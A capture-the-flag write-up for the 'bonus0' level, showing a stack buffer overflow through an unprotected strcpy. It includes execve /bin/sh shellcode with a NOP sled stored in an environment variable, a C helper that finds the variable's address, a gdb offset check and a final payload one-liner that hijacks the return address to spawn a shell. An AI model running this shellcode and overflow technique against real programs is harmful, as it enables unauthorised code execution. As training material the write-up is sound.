By using gdb we can see strcpy is being used without any protection, so we can in theory abuse this function.

Here is the same shellcode as last time. Nothing can be used so we will find a way to segfault.
```
export SHELLCODE=$(python -c 'print("\x90" * 64 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')
``` 
Here a litle program to find the address of SHELLCODE in the env.
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    if (argc != 2) return 1;
    printf("%p\n", getenv(argv[1]));
    return 0;
}
```
`> gcc /tmp/exploit.c -o /tmp/exploit && /tmp/./exploit SHELLCODE`
> 0xbffff8c3

```gdb
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 -
aaAAbbBBccCCddDDeeEEffFFggGGhhHHiiIIjjJJkkKKllLLmmMMnnNNooOOppPPqqQQrrRRssSSttTTuuUUvvVVwwWWxxXXyyYYzzZZ
 - 
aaAAbbBBccCCddDDeeEEffFFggGGhhHHiiIIjjJJkkKKllLLmmMMnnNNooOOppPPqqQQrrRRssSSttTTuuUUvvVVwwWWxxXXyyYYzzZZ
aaAAbbBBccCCddDDeeEEaaAAbbBBccCCddDDeeEE aaAAbbBBccCCddDDeeEE

Program received signal SIGSEGV, Segmentation fault.
0x64434363 in ?? ()
```

0x64434363 = 'cCCd' witch is at position 9. The binary segfault at 9 char in the second input.

Before we get the flag, a quick explaination on why I will (and have) offset the shellcode with '\x90' (NOP). This is known as Nop sled and is used to prevent stack misalignment on top of wrong jump. Maybe the shellcode we created is not exactly where our little program tells us. By using NOP we ensure the correct behavior of our shellcode.

In the bonus binary, strchr is called to find a \n. We will used that to exploit.


`(python -c "print('\x90' * 4095 + '\n' + '\x90' * 9 + '\xbf\xff\xf8\xc3'[::-1] + '\x90' * 50)"; cat) | ./bonus0`
